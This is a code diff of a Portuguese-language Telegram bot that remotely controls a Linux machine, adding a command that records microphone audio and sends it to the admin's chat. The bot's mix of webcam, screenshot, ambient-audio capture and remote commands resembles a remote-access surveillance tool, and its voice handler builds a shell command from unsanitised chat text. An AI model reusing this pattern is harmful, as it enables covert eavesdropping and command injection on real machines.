@@ -74,7 +74,7 @@ def comandos():
     def start(message):
 
         markup = types.ReplyKeyboardMarkup(one_time_keyboard=False)
-        markup.add('/start','/status','/voice','/screenshot','/webcam','/command','/lock','/unlock','/desligar')
+        markup.add('/start','/status','/voice','/audiolocal','/screenshot','/webcam','/command','/lock','/unlock','/desligar')
 
         if message.chat.id == admin_id:
             bot.send_message(message.chat.id, '🎈 Olá novamente!', reply_markup=markup)
@@ -101,8 +101,8 @@ def comandos():
 
     # Comando voice (roda um comando de voz)
     class User_voice:
-            def __init__(self, voice):
-                self.vc = voice
+        def __init__(self, voice):
+            self.vc = voice
 
     @bot.message_handler(commands=['voice'])
     def voice(message):
@@ -117,11 +117,12 @@ def comandos():
     def processo_audio(message):
 
         markup = types.ReplyKeyboardMarkup(one_time_keyboard=False)
-        markup.add('/start','/status','/voice','/screenshot','/webcam','/command','/lock','/unlock','/desligar')
+        markup.add('/start','/status','/voice','/audiolocal','/screenshot','/webcam','/command','/lock','/unlock','/desligar')
         comando_de_voz = message.text
         input_comando_voz = User_voice.vc = str(comando_de_voz)
         os.system('espeak -vpt-BR+f4 -s170 "{}"'.format(input_comando_voz))
-        bot.send_message(message.chat.id,'🎈 Comando de áudio enviado')
+        bot.send_message(message.chat.id,'🎈 Comando de áudio enviado', reply_markup=markup)
+
 
 
     # Comando screenshot (tira print do sistema e envia ao usuário)
@@ -134,6 +135,39 @@ def comandos():
             os.system('rm ~/print*.png')
         else:
             bot.send_message(message.chat.id, 'Você não é um deles 😎🤭')
+
+
+
+    # Comando audiolocal (envia áudio com som ambiente)
+    class User_audio_local:
+        def __init__(self, audio_local):
+            self.al = audio_local
+
+    @bot.message_handler(commands=['audiolocal'])
+    def audiolocal(message):
+        if message.chat.id == admin_id:
+            time_audio = bot.reply_to(message, '🎈 Digite o tempo de gravação desejado em segundos.')
+            bot.register_next_step_handler(time_audio, processo_audio_local)
+        else:
+            bot.send_message(message.chat.id, 'Você não é um deles 😎🤭')
+
+
+    def processo_audio_local(message):
+
+        markup = types.ReplyKeyboardMarkup(one_time_keyboard=False)
+        markup.add('/start','/status','/voice','/audiolocal','/screenshot','/webcam','/command','/lock','/unlock','/desligar')
+        al = message.text
+        input_comando_audiolocal = User_audio_local.al = al
+        
+        try: 
+            int(input_comando_audiolocal) 
+            bot.send_message(message.chat.id,'🎈 Gravando áudio de {} segundos'.format(input_comando_audiolocal))
+            os.system('arecord -d {} -f U8 ~/audiolocal.mp3'.format(input_comando_audiolocal))
+            bot.send_audio(message.chat.id, audio = open(home+'/audiolocal.mp3', 'rb'), reply_markup=markup)
+            os.system('rm ~/audiolocal*.mp3')
+        except Exception as e:
+            bot.send_message(message.chat.id, '🎈 Digite um valor válido.', reply_markup=markup)
+        
 
 
 
@@ -179,7 +213,7 @@ def comandos():
     def processo(message):
 
         markup = types.ReplyKeyboardMarkup(one_time_keyboard=False)
-        markup.add('/start','/status','/voice','/screenshot','/webcam','/command','/lock','/unlock','/desligar')
+        markup.add('/start','/status','/voice','/audiolocal','/screenshot','/webcam','/command','/lock','/unlock','/desligar')
         cmd = message.text
         input_comando = User.cmd = str(cmd)
 
